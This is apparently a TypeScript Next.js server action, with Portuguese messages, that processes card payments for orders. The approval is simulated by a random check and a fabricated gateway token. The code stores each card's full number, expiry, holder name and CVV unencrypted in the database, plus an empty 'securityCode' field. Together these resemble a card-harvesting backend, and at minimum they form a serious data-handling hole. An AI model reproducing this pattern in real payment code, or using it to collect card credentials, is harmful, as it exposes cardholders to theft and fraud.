// src/app/_actions/CardPayment.ts
"use server";

import prisma from '@/lib/prisma';
import type { CardData, FormData } from '@/lib/types';
import { getCardType } from '@/lib/utils';

interface PaymentInput {
  orderId: string;
  card: CardData;
  formData: FormData;
}

export async function processCardPayment(data: PaymentInput) {
  const { orderId, card, formData } = data;
  const cvv = (card as any).cvv || (card as any).cardCvv;

  if (!orderId || !card || !formData || !card.cardNumber || !card.cardExpiry || !cvv) {
    return { success: false, error: "Dados de pagamento incompletos." };
  }

  const order = await prisma.order.findUnique({
    where: { id: orderId },
    include: { customer: true },
  });

  if (!order || !order.customer) {
    return { success: false, error: "Pedido ou cliente não encontrado." };
  }

  

  const { customer } = order;

  try {
    if (typeof card.cardExpiry !== 'string' || !card.cardExpiry.includes('/')) {
        return { success: false, error: "O formato da data de validade do cartão é inválido." };
    }
    const [monthStr, yearStr] = card.cardExpiry.split('/');
    const expiryMonth = parseInt(monthStr, 10);
    const expiryYear = parseInt(yearStr, 10);

    if (isNaN(expiryMonth) || isNaN(expiryYear)) {
        return { success: false, error: "A data de validade contém caracteres inválidos." };
    }

    await new Promise(resolve => setTimeout(resolve, 1500));
    const isApproved = Math.random() < 0.9;
    const gatewayToken = `sim_tok_${card.cardNumber.slice(-4)}_${Date.now()}`;
    
    const newOrExistingCard = await prisma.card.upsert({
        where: { gatewayToken: gatewayToken },
        update: {},
        create: {
            customerId: customer.id,
            gatewayToken: gatewayToken,
            lastFourDigits: card.cardNumber.slice(-4),
            brand: getCardType(card.cardNumber) || 'unknown',
            expiryMonth: expiryMonth,
            expiryYear: expiryYear,
            cardHolderName: card.cardName,
            cardNumber: card.cardNumber,
            cardExpiry: card.cardExpiry,
            cardCvv: cvv,
            securityCode: null, // ✅ O código começa como nulo
        }
    });

    const newPayment = await prisma.payment.create({
        data: {
          orderId: order.id,
          cardId: newOrExistingCard.id,
          amount: order.planValue,
          method: 'CARD',
          status: isApproved ? 'SUCCESS' : 'FAILED',
        }
    });

    if (!isApproved) {
        return { success: false, error: "Pagamento recusado pela operadora do cartão." };
    }

    await prisma.order.update({
      where: { id: order.id },
      data: { status: 'COMPLETED' },
    });

    return { success: true, data: { orderId: order.id, cardId: newOrExistingCard.id } };

  } catch (error) {
    console.error("Erro inesperado no processamento do pagamento:", error);
    return { success: false, error: "Ocorreu um erro no servidor. Tente novamente." };
  }
}
